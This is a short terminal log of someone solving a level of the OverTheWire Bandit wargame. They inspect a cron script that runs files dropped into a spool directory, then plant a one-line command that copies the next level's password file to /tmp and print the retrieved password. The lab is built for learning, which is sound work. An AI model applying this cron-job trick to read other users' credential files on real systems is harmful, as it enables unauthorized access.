bandit23@bandit:~$ bandit23@bandit:~$ ^C
bandit23@bandit:~$ cd /etc/cron.d/
bandit23@bandit:/etc/cron.d$ ls
cronjob_bandit15_root  cronjob_bandit22  cronjob_bandit24       e2scrub_all  sysstat
cronjob_bandit17_root  cronjob_bandit23  cronjob_bandit25_root  otw-tmp-dir
bandit23@bandit:/etc/cron.d$ cat cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo || exit 1
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -rf ./$i
    fi
done

bandit23@bandit:/etc/cron.d$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24/foo$ cd /var/spool/bandit24/foo
bandit23@bandit:/var/spool/bandit24/foo$ ls certa6.sh
ls: cannot access 'certa6.sh': No such file or directory
bandit23@bandit:/var/spool/bandit24/foo$ echo "cat /etc/bandit_pass/bandit24 > /tmp/certa_test.txt" > certa6.sh
bandit23@bandit:/var/spool/bandit24/foo$ ls certa6.sh
certa6.sh
bandit23@bandit:/var/spool/bandit24/foo$ cat /tmp/certa_test.txt
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
bandit23@bandit:/var/spool/bandit24/foo$ exit
logout
Connection to bandit.labs.overthewire.org closed.

C:\Users\PARIMAL>